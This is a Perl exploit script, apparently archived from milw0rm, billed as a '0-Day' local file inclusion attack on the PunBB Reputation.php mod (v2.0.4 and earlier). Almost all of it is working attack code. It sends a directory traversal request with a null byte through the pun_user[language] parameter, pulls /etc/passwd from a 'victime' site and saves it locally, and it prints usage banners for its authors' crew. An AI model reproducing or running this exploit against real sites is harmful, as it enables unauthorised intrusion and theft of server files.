#!/usr/bin/perl
#[0-Day] PunBB Reputation.php Mod <= v2.0.4 Local File Inclusion Exploit
#Coded By Dante90, WaRWolFz Crew
#Bug Discovered By: Dante90, WaRWolFz Crew
#register_globals = On
#magic_quotes_gpc = On


use LWP::UserAgent;
use HTTP::Cookies;
use strict;

my $EtcPasswd;
my $TransversalDirectory = "./../../../../"; #Transversal Directory
my $LFI = "etc/passwd"; #File Inject
my $HostName = "http://www.victime_site.org/path/"; #Insert Victime Web Site Link

my $Referrer = "http://www.warwolfz.com/";

my $Cookies = new HTTP::Cookies;
my $UserAgent = new LWP::UserAgent(
			agent => 'Mozilla/5.0',
			max_redirect => 0,

			cookie_jar => $Cookies,
		) or die $!;

sub Local_File_Inclusion{
	my ($Directory,$Command) = @_;
	return "./include/reputation/rep_profile.php?pun_user[language]=${Directory}${Command}%00";

}

my $Get = $UserAgent->get($HostName.Local_File_Inclusion($TransversalDirectory,$LFI));

if ($Get->content =~ /No such file or directory in/i){
	refresh($HostName, "Exploit Filed");
	print " * Error extracting sensible data.\n";

	print " * Exploit Failed                                     *\n";
	print " ------------------------------------------------------ \n\n";
}else{
	$EtcPasswd = $Get->content;
	open ( FILE , ">WaRWolFz.html" ) or die $!;

	print FILE $EtcPasswd;
	close ( FILE );
	refresh($HostName, "File Saved");
	print " * Exploit Successed                                  *\n";
	print " ------------------------------------------------------\n\n";

	system("pause");
}

sub usage{
	system("cls");
	{
		print " \n [0-Day] PunBB Reputation.php Mod <= v2.0.4 Local File Inclusion Exploit\n";
		print " ------------------------------------------------------ \n";

		print " * USAGE:                                             *\n";
		print " * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n";
		print " * perl name_exploit.pl                               *\n";

		print " ------------------------------------------------------ \n";
		print " *         Powered By Dante90, WaRWolFz Crew          *\n";
		print " * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n";

		print " ------------------------------------------------------ \n";
	};
	exit;
}

sub refresh{
	system("cls");
	{
		print " \n [0-Day] PunBB Reputation.php Mod <= v2.0.4 Local File Inclusion Exploit\n";

		print " ------------------------------------------------------ \n";
		print " * USAGE:                                             *\n";
		print " * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n";

		print " * perl name_exploit.pl                               *\n";
		print " ------------------------------------------------------ \n";
		print " *         Powered By Dante90, WaRWolFz Crew          *\n";

		print " * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n";
		print " ------------------------------------------------------ \n";

	};
	print " * Victime Site: " . $_[0] . "\n";
	print " * Etc/Passwd: " . $_[1] . "\n";
}

#WaRWolFz

# milw0rm.com [2009-07-30]
